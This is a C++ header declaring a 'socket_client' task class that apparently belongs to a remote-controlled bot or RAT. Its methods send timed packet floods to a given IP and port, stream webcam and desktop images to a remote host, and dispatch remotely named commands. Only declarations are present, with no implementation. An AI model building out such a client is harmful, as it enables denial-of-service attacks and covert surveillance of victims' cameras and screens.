#pragma once
#include <string>
#include <chrono>

#include <boost/asio/io_service.hpp>
#include <boost/asio/ip/udp.hpp>
#include <boost/asio/ip/tcp.hpp>

#include <boost/asio/connect.hpp>
#include <boost/array.hpp>
#include <boost/asio/placeholders.hpp>
#include <boost/asio/write.hpp>
#include <boost/asio/read.hpp>
#include <boost/bind.hpp>
#include <boost/shared_ptr.hpp>

#include <opencv2/core/core.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>

#include <task/base/base_task.h>


class socket_client : public client::base::base_task
{
	boost::asio::io_service io_service;
	boost::asio::ip::udp::socket socket_udp;
	boost::asio::ip::tcp::socket socket_tcp;

	boost::system::error_code error;

	boost::array<char, 1024> buffer;

	std::mutex mtx;

	uint16_t port;
	std::string ip;
	
	std::chrono::steady_clock::time_point start_time;

	void set_config(uint16_t _port, std::string _ip);
	
	bool open_socket_udp();
	bool open_socket_tcp();

	void send_packets(uint32_t seconds);

	void send_image_webcam();
	void send_image_desktop();
	bool send_image(cv::Mat& frame, std::vector<int>& param);


	double get_elapsed_time();
	void set_time_now();
	void init_thread_timeout();
	void thread_timeout();
public:
	bool drop_connection(std::string port, std::string ip, std::string seconds);
	bool webcam_realtime(std::string port, std::string ip);
	bool desktop_realtime(std::string port, std::string ip);

	void execute();
	void on_execute();
	void run(
		std::string id,
		bool response,
		std::string method,
		std::vector<std::string> args
	);
	_function fetch_function(std::string);

	socket_client() : socket_udp(io_service) , socket_tcp(io_service) {}
};

